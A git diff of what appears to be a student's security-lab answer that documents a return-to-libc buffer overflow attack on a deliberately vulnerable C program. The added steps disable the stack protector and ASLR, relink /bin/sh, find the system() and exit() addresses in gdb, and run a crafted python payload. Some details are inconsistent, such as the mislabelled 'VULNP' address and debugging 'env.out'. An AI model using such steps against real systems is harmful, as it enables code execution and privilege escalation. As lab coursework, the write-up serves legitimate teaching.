@@ -39,7 +39,7 @@ void main() {
   You are free to choose Code Injection or Environment Variable approach to do. 
 - Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
 **Answer 1**: Must conform to below structure:
-***Preparation***
+***1. Preparation***
 ***Step 1: Run the command below to setup the environment***
 
 
@@ -95,7 +95,72 @@ void main() {
 ***Idea***
 
 
-***Step2: Compile code***
+***2. Attack***
+***2.1. Compile file***
+Compile the vulnerable.c and shellcode.c with following command: 
+- gcc -g vulnerable.c -o vulnerable.out -fno-stack-protector -mpreferred-stack-boundary=2
+- gcc -g shellcode.c -o shellcode.out -fno-stack-protector -mpreferred-stack-boundary=2
+
+
+***2.2. Disabling Security Features***
+
+Create a link to zsh instead of the default dash to disable the bash countermeasures in Ubuntu 16.04.
+
+sudo ln -sf /bin/zsh /bin/sh
+
+
+Disable the operating system's address space layout randomization.
+
+
+sudo sysctl -w kernel.randomize_va_space=0
+
+
+***2.3. Export environment variable***
+Then, we declare an environment variable named SHELLCODE to store the path of the output file after compiling shellcode.c.
+
+export SHELLCODE=/home/seed/seclabs/bof/shellcode.o
+
+***2.4. Debug vulnerable.c file with gdb to find the address of system function, exit fuction, SHELLCODE variable***
+Run code & debug:
+gdb -q env.out
+start
+Then find the neccessary address:
+p system
+p exit
+print getenv("SHELLCODE")
+
+
+![image](https://github.com/user-attachments/assets/aa843bb3-8121-4d7f-abb0-e679acf38d90)
+
+
+Observing the results:
+
+Address of system(): 0xf7e50db0
+Address of exit(): 0xf7e449e0
+Address of VULNP: 0xffffd8fd
+
+***2.5. ATTACK***
+Run the command: 
+  run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\xfd\xd8\xff\xff')")
+After running command, here's the result:
+
+![image](https://github.com/user-attachments/assets/cba772fc-cbf6-4b33-8d46-297bf7a9a9e8)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
